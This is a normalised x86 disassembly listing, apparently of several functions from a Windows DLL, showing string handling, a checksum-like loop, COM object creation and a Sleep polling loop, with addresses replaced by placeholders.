mov [ ebp - 0x4 ] 0xe
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov edx [ ebp - 0x4ac ]
lea ecx [ ebp - 0x49c ]
push ecx
push edx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_1006adf0
add esp 0x8
test eax eax
lea ecx [ ebp - 0x47c ]
sete bl
call sub_10029c40
lea ecx [ ebp - 0x498 ]
mov [ ebp - 0x4 ] 0x6
call sub_10029c40
test bl bl
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0x15c ]
mov eax 0x140
call sub_10013830
lea edx [ ebp - 0x3f0 ]
push edx
lea edx [ ebp - 0x15c ]
call sub_1005eea0
jmp r-xdata
mov edx [ ebp - 0x49c ]
lea eax [ ebp - 0x3f0 ]
push eax
call sub_1005eea0
mov ecx [ ebp - 0x49c ]
push ecx
call [ SysFreeString@IAT ]
jmp r-xdata
cmp [ ebp - 0x3dc ] 0x8
mov [ ebp - 0x414 ] 0xf
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x428 ] 0x0
jb r-xdata
mov edx [ ebp - 0x428 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x4ac ]
lea ecx [ ebp - 0x49c ]
push ecx
push edx
mov ecx eax
lea edx [ ebp - 0x3d4 ]
call sub_10043b70
add esp 0x8
test eax eax
lea ecx [ ebp - 0x47c ]
sete bl
call sub_10029c40
lea ecx [ ebp - 0x498 ]
mov [ ebp - 0x4 ] 0x6
call sub_10029c40
test bl bl
jne r-xdata
mov eax [ eax ]
lea edx [ ebp - 0xf4 ]
mov eax 0x3d
call sub_10013830
lea edx [ ebp - 0x3f0 ]
push edx
lea edx [ ebp - 0xf4 ]
call sub_1005eea0
jmp r-xdata
mov eax [ ebp - 0x3f0 ]
push eax
lea edx [ ebp - 0x104 ]
mov eax 0x56
call sub_10013830
lea edx [ ebp - 0x3f0 ]
push edx
lea edx [ ebp - 0x104 ]
call sub_1005eea0
jmp r-xdata
sub_1000e9c0
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x3f
add eax ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
div [ ecx + 0x108 ]
pop edi
pop esi
pop ebx
mov eax edx
mov esp ebp
pop ebp
retn 0x8
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0xc ]
sub_1000ea8f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1000eae7
push 0x4
mov eax sub_1007f6d3
call sub_100097c8
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1001543e
mov eax esi
call sub_1004db01
retn 0x8
sub_1000eb20
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10080540
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x30 ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1004faa0
test eax eax
je r-xdata
push ebx
call [ CoInitialize@IAT ]
test eax eax
jne r-xdata
call sub_1003b590
test eax eax
je r-xdata
lea eax [ ebx + 0x5 ]
jmp r-xdata
mov eax 0x1
lea ecx [ esp + 0x18 ]
push ecx
push r--data
push 0x4
push ebx
push r--data
mov [ esp + 0x30 ] 0x4
call [ CoCreateInstance@IAT ]
cmp [ esp + 0x18 ] ebx
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
mov [ esp + 0x1c ] 0x2
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
lea edx [ esp + 0x34 ]
push edx
call [ VariantInit@IAT ]
lea edx [ esp + 0x48 ]
mov eax 0x52
call sub_10013830
mov eax edx
push eax
call [ SysAllocString@IAT ]
lea edx [ esp + 0x34 ]
push edx
push edx
push edx
mov esi eax
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
push edx
push esi
push eax
mov eax [ ecx + 0x2c ]
call eax
push esi
mov [ esp + 0x18 ] eax
call [ SysFreeString@IAT ]
mov edi [ Sleep@IAT ]
xor esi esi
cmp [ esp + 0x14 ] ebx
jne r-xdata
push 0x64
call edi
inc esi
cmp esi 0xa
jl r-xdata
mov [ esp + 0x1c ] 0x3
mov [ esp + 0x70 ] ebx
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x14 ]
mov [ esp + 0x14 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x2c ]
mov [ esp + 0x2c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xe0 ]
call eax
cmp [ esp + 0x2c ] 0x4
je r-xdata
mov [ esp + 0x70 ] 0xffffffff
cmp eax ebx
je r-xdata
lea edx [ esp + 0x24 ]
mov [ esp + 0x70 ] 0x1
push edx
mov [ esp + 0x28 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x80 ]
push eax
call edx
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ esp + 0x70 ] bl
cmp eax ebx
je r-xdata
mov [ esp + 0x70 ] 0x2
lea edx [ esp + 0x20 ]
mov [ esp + 0x20 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1b0 ]
call eax
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x70 ] 0x1
cmp eax ebx
je r-xdata
mov [ esp + 0x70 ] 0x3
lea edx [ esp + 0x28 ]
mov [ esp + 0x28 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xfc ]
call eax
mov eax [ esp + 0x28 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x70 ] 0x2
cmp eax ebx
je r-xdata
mov edx [ esp + 0x30 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
mov eax [ esp + 0x28 ]
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x1c ] ebx
sub_1000edbc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_10050437
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1002a5ec
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_10078db0
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_1001e0aa
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_1000ee68
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000329e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1000ef10
push ebp
mov ebp esp
push 0xffffffff
push sub_10081f20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x184
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x168 ] ecx
mov ecx [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x16c ] edx
mov [ ebp - 0x170 ] ecx
cmp [ eax + 0xec ] ebx
jne r-xdata
mov ecx [ eax + 0x108 ]
add ecx [ eax + 0x100 ]
mov edx [ eax + 0x50 ]
lea esi [ ecx * 8 ]
sub esi ecx
mov ecx [ eax + 0xd8 ]
lea edx [ esi + edx + 0x2e ]
cmp ecx edx
jbe r-xdata
lea eax [ ebx + 0x42 ]
jmp r-xdata
mov ecx 0x1f4
sub ecx edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x170 ]
cmp [ edx + 0x10 ] ebx
mov edi [ ebp - 0x164 ]
sete al
xor ecx ecx
cmp al bl
sete cl
lea esi [ ebp - 0x154 ]
add ecx 0x6
push ecx
call sub_10023b00
mov [ ebp - 0x4 ] ebx
push 0x2
push r--data
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ eax + 0x10c ]
shr ecx 0x3
mov [ ebp - 0x15c ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0x9c ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_10050437
push edi
push esi
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
mov edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x184 ] eax
lea eax [ ebp - 0x10c ]
push r--data
push eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x1c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0x10c ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x1c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
push 0x3
push r--data
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0xa4 ] 0xf
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0xb8 ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x38 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
push 0x1
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x18c ] eax
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
call sub_10043190
mov [ ebp - 0x4 ] 0x4
push 0x1
lea ecx [ ebp - 0x80 ]
cmp [ esi ] ebx
jne r-xdata
push r--data
call sub_10050437
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x54 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0x80 ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_10050437
call sub_10067f90
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x54 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
mov edx [ ebp - 0x15c ]
push edx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x188 ] eax
call sub_1006a2d0
push eax
lea eax [ ebp - 0x128 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0x7
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
mov ecx [ ebp - 0x164 ]
push eax
push ecx
lea edi [ ebp - 0x128 ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x164 ]
lea eax [ esi + 0x70 ]
push eax
push ecx
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x15c ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0xf0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x8
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x150 ]
mov esi [ ebp - 0x154 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp ecx 0x5
ja r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x8c ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
mov esi [ ebp - 0x164 ]
push eax
push esi
lea edi [ ebp - 0xf0 ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x5
ja r-xdata
push r--data
call sub_10050437
lea eax [ edi + 0x8c ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
mov [ ebp - 0x180 ] eax
mov [ ebp - 0xc0 ] 0xf
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] bl
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0xb
cmp [ eax + 0x10 ] ebx
je r-xdata
push r--data
call sub_10050437
mov edx [ ebp - 0x184 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
call sub_100074a0
mov esi eax
lea ecx [ ebp - 0x9c ]
push ecx
lea edx [ ebp - 0x48 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xe
call sub_1006bcb0
mov edi eax
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0x150 ]
mov ecx [ ebp - 0x154 ]
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push eax
lea ecx [ ebp - 0x2c ]
push r--data
push ecx
call sub_100430c0
add esp 0xc
push eax
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0xc
call sub_1000adb0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push 0xffffffff
push ebx
push edi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x6
ja r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
lea eax [ ebp - 0x154 ]
call sub_1004c5f0
push eax
push esi
lea edi [ ebp - 0xd4 ]
call sub_1001a220
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x6
ja r-xdata
push r--data
call sub_10050437
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
lea eax [ edi + 0xa8 ]
push eax
push esi
lea eax [ ebp - 0x154 ]
call sub_1000e9c0
mov [ ebp - 0x17c ] eax
push r--data
call sub_10050437
mov ecx [ ebp - 0x168 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x18c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x14
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x38 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x18 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x17
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x54 ]
push esi
call sub_10035d20
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov edi 0x10
mov esi 0xf
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x15c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push ebx
lea ecx [ edi + 0x70 ]
push esi
call sub_10035d20
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov esi 0x10
mov edi 0xf
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xb
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x48 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x150 ]
mov edi [ ebp - 0x154 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
